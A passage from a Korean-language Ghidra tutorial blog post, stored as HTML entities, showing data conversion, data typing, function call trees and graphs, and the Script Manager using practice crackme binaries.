&#xB300;&#xD574;&#xC11C; &#xC54C;&#xC544;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xB294; &#xB370;&#xC774;&#xD130; &#xBCC0;&#xD658;, &#xB370;&#xC774;&#xD130; &#xD0C0;&#xC785; &#xC801;&#xC6A9;, &#xD568;&#xC218; &#xD638;&#xCD9C; &#xD2B8;&#xB9AC; &#xBC0F; &#xADF8;&#xB798;&#xD504;, &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xB9E4;&#xB2C8;&#xC800;&#xC640; &#xBA54;&#xBAA8;&#xB9AC; &#xB9F5;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xB2E4;&#xB8F0; &#xC608;&#xC815;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xBC88; &#xC2DC;&#xAC04;&#xC5D0; &#xC608;&#xC81C;&#xB85C; &#xB2E4;&#xB8F0; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB294; &#xCD1D; &#xB450; &#xAC00;&#xC9C0;&#xC785;&#xB2C8;&#xB2E4;. <a href="https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/">Part 1</a>&#xC5D0;&#xC11C; &#xB2E4;&#xB8E8;&#xC5C8;&#xB358; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC640; <a href="http://reversing.kr/">reversing.kr</a>&#xC5D0; &#xC5C5;&#xB85C;&#xB4DC;&#xB41C; Easy Keygen &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;.</p><h1 id="&#xB370;&#xC774;&#xD130;-&#xBCC0;&#xD658;"><a href="#&#xB370;&#xC774;&#xD130;-&#xBCC0;&#xD658;" class="headerlink" title="&#xB370;&#xC774;&#xD130; &#xBCC0;&#xD658;"></a>&#xB370;&#xC774;&#xD130; &#xBCC0;&#xD658;</h1><p>&#xBD84;&#xC11D;&#xC744; &#xC218;&#xD589;&#xD560; &#xB54C; &#xAC01;&#xC790; &#xC120;&#xD638;&#xD558;&#xB294; &#xB370;&#xC774;&#xD130; &#xD0C0;&#xC785;&#xC774; &#xC788;&#xC744; &#xC218;&#xB3C4; &#xC788;&#xACE0;, &#xC544;&#xB2C8;&#xBA74; &#xBD80;&#xC815;&#xD655;&#xD558;&#xAC8C; &#xB370;&#xC774;&#xD130; &#xD0C0;&#xC785;&#xC774; &#xD45C;&#xC2DC;&#xB418;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. 10&#xC9C4;&#xC218;&#xB85C; &#xBCF4;&#xACE0; &#xC2F6;&#xC740;&#xB370; 16&#xC9C4;&#xC218;&#xB85C; &#xD45C;&#xC2DC;&#xB418;&#xC5B4; &#xC788;&#xAC70;&#xB098; &#xADF8; &#xBC18;&#xB300;&#xC778; &#xACBD;&#xC6B0;&#xAC00; &#xC788;&#xC8E0;.</p><p>&#xC790; &#xC77C;&#xB2E8; ghidra&#xB97C; &#xD1B5;&#xD574; crackme.exe &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xD30C;&#xC77C;&#xC744; &#xC5F0; &#xD6C4; main &#xD568;&#xC218;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00; &#xBD05;&#xC2DC;&#xB2E4;. &#xC88C;&#xCE21; Symbol Tree&#xC5D0;&#xC11C; Functions &#xD3F4;&#xB354;&#xB97C; &#xD655;&#xC7A5;&#xD558;&#xACE0; <code>_main</code> &#xD568;&#xC218;&#xB97C; &#xCC3E;&#xC544;&#xC11C; &#xD074;&#xB9AD;&#xD574;&#xC8FC;&#xC2DC;&#xBA74; &#xC911;&#xC559; &#xD654;&#xBA74;&#xACFC; &#xB514;&#xC2A4; &#xC5B4;&#xC148;&#xBE14; &#xCC3D;&#xC5D0;&#xC11C; main &#xD568;&#xC218;&#xB97C; &#xCD9C;&#xB825;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%202.png" alt></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%203.png" alt></p><p>&#xC800;&#xBC88; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C; &#xC785;&#xB825; &#xAC12;&#xC774; <code>0x1232b14</code>&#xC5EC;&#xC57C; &#xD558;&#xB294; &#xC810;&#xC740; &#xC54C;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; &#xADF8;&#xB0E5; &#xB300;&#xCDA9; &#xC4F1; &#xD6D1;&#xC5B4;&#xBCF4;&#xACE0; <code>0x1232b14</code>&#xC5D0;&#xC11C; 0x&#xB97C; &#xBE80; <code>1232b14</code>&#xB97C; &#xC801;&#xB294;&#xB2E4;&#xBA74;?</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%204.png" alt></p><p>Fail &#xBB38;&#xAD6C;&#xB97C; &#xBD10;&#xBC84;&#xB9BD;&#xB2C8;&#xB2E4;&#x2026; &#xACC4;&#xC0B0;&#xAE30;&#xB97C; &#xCF1C;&#xACE0; &#xC785;&#xB825;&#xD574;&#xC11C; 10&#xC9C4;&#xC218;&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xAE30; &#xADC0;&#xCC2E;&#xACE0;, python&#xC744; &#xCF1C;&#xC11C; <code>0x1232b14</code>&#xB97C; 10&#xC9C4;&#xC218;&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xAE30;&#xB3C4; &#xADC0;&#xCC2E;&#xC740;&#xB370; ghidra&#xC5D0;&#xC11C; &#xBC14;&#xB85C; &#xBCC0;&#xD658;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xC5C6;&#xC744;&#xAE4C;???</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%205.png" alt></p><p>&#xBCC0;&#xD658;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;&#xC774; &#xC5C6;&#xB2E4;&#xBA74; IDA&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC65C; ghidra&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xAE4C;? &#xB2F9;&#xC5F0;&#xD788; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;!!!</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%206.png" alt></p><p>&#xCEE4;&#xC11C;&#xB97C; &#xC790;&#xC2E0;&#xC774; &#xBCC0;&#xD658;&#xD558;&#xAE38; &#xC6D0;&#xD558;&#xB294; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xD074;&#xB9AD;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74; Listing &#xCC3D;&#xC740; &#xCEE4;&#xC11C;&#xAC00; &#xC704;&#xCE58;&#xD55C; &#xACF3;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xC5B4;&#xC148;&#xBE14;&#xB9AC;&#xB85C; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC774;&#xB3D9;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%207.png" alt></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%208.png" alt></p><p>&#xADF8; &#xD6C4; &#xC6D0;&#xD558;&#xB294; &#xB370;&#xC774;&#xD130; &#xAC12;&#xC744; &#xC6B0;&#xD074;&#xB9AD; - Convert - &#xC6D0;&#xD558;&#xB294; &#xD0C0;&#xC785;&#xC73C;&#xB85C; &#xD074;&#xB9AD;&#xD558;&#xBA74; &#xB370;&#xC774;&#xD130; &#xD0C0;&#xC785;&#xC774; &#xBCC0;&#xACBD;&#xB429;&#xB2C8;&#xB2E4;. &#xAC12;&#xC774; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xBC14;&#xB00C;&#xC5C8;&#xB294;&#xC9C0; &#xD55C; &#xBC88; &#xD655;&#xC778;&#xC744; &#xD574;&#xBD05;&#xC2DC;&#xB2E4;!</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%209.png" alt></p><p>&#xAC12;&#xC774; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xBCC0;&#xD658;&#xB41C; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. :)</p><h1 id="&#xB370;&#xC774;&#xD130;-&#xD0C0;&#xC785;-&#xC801;&#xC6A9;"><a href="#&#xB370;&#xC774;&#xD130;-&#xD0C0;&#xC785;-&#xC801;&#xC6A9;" class="headerlink" title="&#xB370;&#xC774;&#xD130; &#xD0C0;&#xC785; &#xC801;&#xC6A9;"></a>&#xB370;&#xC774;&#xD130; &#xD0C0;&#xC785; &#xC801;&#xC6A9;</h1><p>ghidra&#xC5D0;&#xC11C; &#xBC14;&#xC774;&#xD2B8; &#xBC30;&#xC5F4;&#xC740; &#xC870;&#xAE08; &#xB3C5;&#xD2B9;&#xD558;&#xAC8C; &#xD45C;&#xC2DC;&#xB429;&#xB2C8;&#xB2E4;. &#xB300;&#xBD80;&#xBD84; crackme &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xAE30; &#xC704;&#xD574;&#xC11C;, &#xD639;&#xC740; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xC774; &#xBC14;&#xC774;&#xD2B8; &#xBC30;&#xC5F4;&#xC774; &#xBB38;&#xC790;&#xC5F4;&#xC778;&#xC9C0; &#xC544;&#xB2CC;&#xC9C0;&#xB97C; &#xD310;&#xBCC4;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xBB3C;&#xB860; ghidra&#xC5D0;&#xC11C;&#xB294; &#xBC14;&#xC774;&#xD2B8; &#xBC30;&#xC5F4;&#xC744; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xB294; &#xAC83; &#xAC19;&#xC740; &#xB370;&#xC774;&#xD130; &#xD0C0;&#xC785; &#xC801;&#xC6A9;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. :)</p><p>&#xC774;&#xBC88; &#xBD80;&#xBD84;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC0B4;&#xD3B4;&#xBCF4;&#xAE30; &#xC804;&#xC5D0; Easy Keygen &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; ghidra&#xB85C; &#xC5F4;&#xC5B4;&#xBD05;&#xC2DC;&#xB2E4;!</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2010.png" alt></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2011.png" alt></p><p>main &#xD568;&#xC218;&#xB85C; &#xAC00;&#xAE30; &#xC704;&#xD574;&#xC11C; entry point&#xC5D0;&#xC11C; <code>FUN_00401000</code>&#xC744; &#xD074;&#xB9AD;&#xD558;&#xC5EC; &#xC774;&#xB3D9;&#xD558;&#xC5EC; &#xC90D;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2012.png" alt></p><p>main &#xD568;&#xC218;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xB358; &#xC911; <code>&amp;DAT_0040805c</code>&#xB77C;&#xB294; &#xB140;&#xC11D;&#xC744; &#xB9CC;&#xB0AC;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB140;&#xC11D;&#xC740; &#xBB34;&#xC2A8; &#xAC12;&#xC77C;&#xAE4C;&#x2026; &#xD55C; &#xBC88; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2013.png" alt></p><p><code>%s</code>&#xC600;&#xB124;&#xC694;. &#xADFC;&#xB370; &#xB370;&#xC774;&#xD130; &#xD0C0;&#xC785;&#xC774; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB514; &#xCEF4;&#xD30C;&#xC77C; &#xCC3D;&#xB9CC; &#xBCF8;&#xB2E4;&#xBA74; &#xD55C;&#xB208;&#xC5D0; &#xC5B4;&#xB5A4; &#xAC12;&#xC778;&#xC9C0; &#xB4E4;&#xC5B4;&#xC624;&#xC9C0;&#xAC00; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB140;&#xC11D;&#xC744; &#xD55C; &#xBC88; &#xBCC0;&#xD658;&#xC2DC;&#xCF1C; &#xBCFC;&#xAE4C;&#xC694;?</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2014.png" alt></p><p><code>DAT_0040805c</code> &#xC6B0;&#xD074;&#xB9AD; &#x2192; Data &#x2192; string&#xC744; &#xB204;&#xB974;&#xBA74;?</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2015.png" alt></p><p>&#xC74C;&#x2026; &#xBB54;&#xAC00; &#xD55C;&#xB208;&#xC5D0; &#xD655; &#xB4E4;&#xC5B4;&#xC624;&#xC9C4; &#xC54A;&#xC9C0;&#xB9CC; &#xC5B4;&#xB5A4; &#xAC12;&#xC778;&#xC9C0;&#xB294; &#xB300;&#xCDA9; &#xC54C; &#xC218; &#xC788;&#xAC8C; &#xBCC0;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="&#xD568;&#xC218;-&#xD638;&#xCD9C;-&#xD2B8;&#xB9AC;&#xC640;-&#xD638;&#xCD9C;-&#xADF8;&#xB798;&#xD504;"><a href="#&#xD568;&#xC218;-&#xD638;&#xCD9C;-&#xD2B8;&#xB9AC;&#xC640;-&#xD638;&#xCD9C;-&#xADF8;&#xB798;&#xD504;" class="headerlink" title="&#xD568;&#xC218; &#xD638;&#xCD9C; &#xD2B8;&#xB9AC;&#xC640; &#xD638;&#xCD9C; &#xADF8;&#xB798;&#xD504;"></a>&#xD568;&#xC218; &#xD638;&#xCD9C; &#xD2B8;&#xB9AC;&#xC640; &#xD638;&#xCD9C; &#xADF8;&#xB798;&#xD504;</h1><p>&#xBD84;&#xC11D;&#xC744; &#xD558;&#xB2E4; &#xBCF4;&#xBA74; &#xC774; &#xD568;&#xC218;&#xAC00; &#xC5B4;&#xB514;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xB294;&#xC9C0;, &#xC774; &#xD568;&#xC218;&#xAC00; &#xC5B4;&#xB5A4; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xC57C; &#xD560; &#xB54C;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD568;&#xC218; &#xD638;&#xCD9C; &#xD2B8;&#xB9AC;&#xB97C; &#xD1B5;&#xD574; &#xC774; &#xC791;&#xC5C5;&#xC744; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Easy Keygen &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0;&#xC11C; &#xBA54;&#xC778; &#xD568;&#xC218;&#xAC00; &#xC5B4;&#xB5A4; &#xD568;&#xC218;&#xC5D0; &#xC758;&#xD574;&#xC11C; &#xD638;&#xCD9C;&#xC774; &#xB418;&#xB294;&#xC9C0;, &#xBA54;&#xC778; &#xD568;&#xC218;&#xB294; &#xC5B4;&#xB5A4; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294;&#xC9C0; &#xD568;&#xC218; &#xD638;&#xCD9C; &#xD2B8;&#xB9AC;&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xD655;&#xC778;&#xC744; &#xD574;&#xBCFC;&#xAE4C;&#xC694;?</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2016.png" alt></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2017.png" alt></p><p>main &#xD568;&#xC218;&#xC5D0; &#xC704;&#xCE58;&#xD55C; &#xCC44;&#xB85C; Window &#x2192; Function Call Tress&#xB97C; &#xD074;&#xB9AD;&#xD558;&#xBA74; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xD654;&#xBA74; &#xD558;&#xB2E8;&#xC5D0; &#xD568;&#xC218; &#xD638;&#xCD9C; &#xD2B8;&#xB9AC;&#xAC00; &#xB098;&#xD0C0;&#xB098;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.(&#xC800;&#xB294; &#xC774;&#xBBF8;&#xC9C0;&#xAC00; &#xC88C;&#xC6B0;&#xB85C; &#xAE38;&#xAC8C; &#xB298;&#xC5B4;&#xC838;&#xC11C; &#xD654;&#xBA74; &#xBC14;&#xAE65;&#xC73C;&#xB85C; &#xBE90;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026;^^;;)</p><p>&#xD568;&#xC218; &#xD638;&#xCD9C; &#xD2B8;&#xB9AC;&#xB97C; &#xBCF4;&#xBA74; <code>FUN_00401000</code>&#xC740; <code>entry</code>&#xC5D0; &#xC758;&#xD574;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xC5C8;&#xACE0;, <code>FUN_00401150</code>, <code>FUN_004011a2</code>, <code>FUN_004011b9</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xC2DD;&#xC73C;&#xB85C; &#xD55C;&#xB208;&#xC5D0; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xACA0;&#xC9C0;&#xB9CC; &#xBB54;&#xAC00; &#xADF8;&#xB9BC;&#xC73C;&#xB85C; &#xB418;&#xC5B4;&#xC788;&#xC73C;&#xBA74; &#xC880; &#xB354; &#xC54C;&#xC544;&#xBCF4;&#xAE30; &#xD3B8;&#xD558;&#xACA0;&#xC8E0;? &#xADF8;&#xB807;&#xB2E4;&#xBA74; Window &#x2192; Function Call Graph&#xB97C; &#xD074;&#xB9AD;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;!</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2018.png" alt></p><p>&#xC880; &#xB354; &#xC54C;&#xC544;&#xBCF4;&#xAE30; &#xC27D;&#xAC8C; &#xC5B4;&#xB5A4; &#xD568;&#xC218;&#xC5D0; &#xC758;&#xD574;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xACE0; &#xC5B4;&#xB5A4; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294;&#xC9C0; &#xD55C;&#xB208;&#xC5D0; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB3C;&#xB860; &#xC774;&#xB7F0; &#xCC3D;&#xB4E4;&#xC740; &#xBAA8;&#xB450; &#xCEE4;&#xC2A4;&#xD130;&#xB9C8;&#xC774;&#xC9D5; &#xD574;&#xC11C; &#xC6D0;&#xD558;&#xB294; &#xC704;&#xCE58;&#xC5D0; &#xB458; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2019.png" alt></p><p>&#xC774;&#xB7F0; &#xC2DD;&#xC73C;&#xB85C;&#xB3C4; &#xAD6C;&#xC131;&#xD560; &#xC218; &#xC788;&#xC8E0;. &#xD568;&#xC218;&#xB97C; &#xC774;&#xB3D9;&#xD560; &#xB54C;&#xB9C8;&#xB2E4; &#xC5B4;&#xB5A4; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2020.png" alt></p><h1 id="&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;-&#xB9E4;&#xB2C8;&#xC800;"><a href="#&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;-&#xB9E4;&#xB2C8;&#xC800;" class="headerlink" title="&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xB9E4;&#xB2C8;&#xC800;"></a>&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xB9E4;&#xB2C8;&#xC800;</h1><p>&#xC810;&#xC810; ghidra &#xC0DD;&#xD65C;&#xC774; &#xD3B8;&#xB9AC;&#xD574;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. ghidra&#xB9CC; &#xC788;&#xC73C;&#xBA74; &#xC5B4;&#xC148;&#xB3C4; &#xBCF4;&#xACE0; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB3C4; &#xBCF4;&#xACE0; &#xD568;&#xC218; &#xADF8;&#xB798;&#xD504;&#xB3C4; &#xBCF4;&#xACE0; &#xB370;&#xC774;&#xD130; &#xD0C0;&#xC785;&#xB3C4; &#xB0B4;&#xAC00; &#xC6D0;&#xD558;&#xB294; &#xB300;&#xB85C; &#xC774;&#xAC83;&#xC800;&#xAC83; &#xC218;&#xC815;&#xD558;&#xBA74;&#xC11C; &#xBAA8;&#xB4E0; &#xAC78; &#xB2E4; &#xD560; &#xC218; &#xC788;&#xC744; &#xB4EF;&#xD55C; &#xB290;&#xB08C;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xADFC;&#xB370; &#xC544;&#xC9C1; &#xBB54;&#xAC00; &#xD5C8;&#xC804;&#xD569;&#xB2C8;&#xB2E4;&#x2026; &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xB2E4;&#xAC00; &#xC554;&#xD638;&#xBB38;&#xC774; &#xB098;&#xC640;&#xC11C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC9DC;&#xC57C;&#xD560; &#xAC83; &#xAC19;&#xC740;&#xB370;&#x2026; &#xB09C; ghidra&#xB9CC; &#xC788;&#xC73C;&#xBA74; &#xBB50;&#xB4E0;&#xC9C0; &#xB2E4; &#xD560; &#xC218; &#xC788;&#xC744; &#xAC83;&#xC774;&#xB77C; &#xC0DD;&#xAC01;&#xD588;&#xB294;&#xB370; vscode&#xB97C; &#xCF1C;&#xC11C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC791;&#xC131;&#xD558;&#xACE0; cmd&#xB97C; &#xCF1C;&#xC11C; python&#xC744; &#xC2E4;&#xD589;&#xD558;&#xC5EC; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xAE30;&#xBD84;&#xC774; &#xB098;&#xC069;&#xB2C8;&#xB2E4;. ghidra&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xBB50;&#xB4E0; &#xD574;&#xB0B4;&#xACE0; &#xC2F6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2021.png" alt></p><p>&#xC695;&#xC2EC;&#xC744; &#xBD80;&#xB9AC;&#xACE0; &#xC2F6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD234; &#xD558;&#xB098;&#xB85C; &#xB2E4; &#xD574;&#xBC84;&#xB9AC;&#xACE0; &#xC2F6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD63C;&#xC790;&#xC11C; &#xB2E4; &#xB54C;&#xB824; &#xBD80;&#xC218;&#xACE0; &#xB2E4;&#xB2C8;&#xB294; &#xC800;&#xAE30; &#xC800; &#xC2AC;&#xB77C;&#xC784;&#xCC98;&#xB7FC;&#xC694;. &#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xB9E4;&#xB2C8;&#xC800;&#xAC00; &#xC5EC;&#xB7EC;&#xBD84;&#xC744; &#xB3C4;&#xC640;&#xC904; &#xAC81;&#xB2C8;&#xB2E4;! ghidra&#xC5D0;&#xC11C;&#xB294; IDA Python&#xCC98;&#xB7FC; JAVA&#xC640; python &#xB4F1;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xB9E4;&#xB2C8;&#xC800;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xBC31;&#xBB38;&#xC774; &#xBD88;&#xC5EC;&#xC77C;&#xACAC;! &#xB208;&#xC73C;&#xB85C; &#xC9C1;&#xC811; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2022.png" alt></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2023.png" alt></p><p>Window &#x2192; Script Manager&#xB97C; &#xD074;&#xB9AD;&#xD558;&#xBA74; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xB9E4;&#xB2C8;&#xC800; &#xCC3D;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xACE0; &#xAD49;&#xC7A5;&#xD788; &#xB9CE;&#xC740; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB4E4;&#xC774; &#xB098;&#xD0C0;&#xB0A9;&#xB2C8;&#xB2E4;. &#xCE74;&#xD14C;&#xACE0;&#xB9AC;&#xB85C; &#xB9CE;&#xC774; &#xBD84;&#xB958;&#xAC00; &#xB418;&#xC5B4;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; &#xB098;&#xB294; &#xC5EC;&#xAE30; &#xC788;&#xB294; &#xAC70; &#xB9D0;&#xACE0; &#xB0B4;&#xAC00; &#xC9C1;&#xC811; &#xC9E0; python &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xC2F6;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; <code>Hello, ghidra World!</code>&#xB97C; &#xCD9C;&#xB825;&#xD558;&#xACE0; &#xC2F6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xD55C; &#xBC88; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC9C1;&#xC811; &#xC791;&#xC131;&#xD574;&#xBCFC;&#xAE4C;&#xC694;?</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2024.png" alt></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2025.png" alt></p><p>&#xBA3C;&#xC800; Bundle Manager&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xCF1C;&#xC11C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB4E4;&#xC758; &#xACBD;&#xB85C;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;. <code>$USER_HOME/ghidra_scripts</code>&#xC5D0; &#xB0B4;&#xAC00; &#xC791;&#xC131;&#xD55C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; &#xC800;&#xC7A5;&#xB420; &#xAC83; &#xAC19;&#xC740;&#xB370; <code>file not found</code>&#xB77C;&#xACE0; &#xB739;&#xB2C8;&#xB2E4;. &#xC74C;&#x2026; &#xBC14;&#xD0D5;&#xD654;&#xBA74;&#xC5D0; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC800;&#xC7A5;&#xD560; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xB9CC;&#xB4E4;&#xACE0; &#xAC70;&#xAE30;&#xC5D0; &#xC791;&#xC131;&#xD55C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xB123;&#xC5B4;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2026.png" alt></p><p><code>USER_HOME</code>&#xC5D0; ghidra_scripts &#xD3F4;&#xB354;&#xB97C; &#xB9CC;&#xB4E4;&#xC5C8;&#xC73C;&#xB2C8; &#xC774;&#xC81C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD569;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2027.png" alt></p><p>&#xBC88;&#xB4E4; &#xB9E4;&#xB2C8;&#xC800;&#xC5D0;&#xC11C; &#xCD08;&#xB85D;&#xC0C9; + &#xBC84;&#xD2BC;&#xC744; &#xB204;&#xB978; &#xD6C4; &#xBC14;&#xD0D5;&#xD654;&#xBA74;&#xC758; ghidra_scripts &#xD3F4;&#xB354;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xBA74;&#x2026;</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2028.png" alt></p><p>&#xCD94;&#xAC00;&#xAC00; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; &#xD574;&#xB2F9; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; Python &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC791;&#xC131;&#xD55C; &#xD6C4; 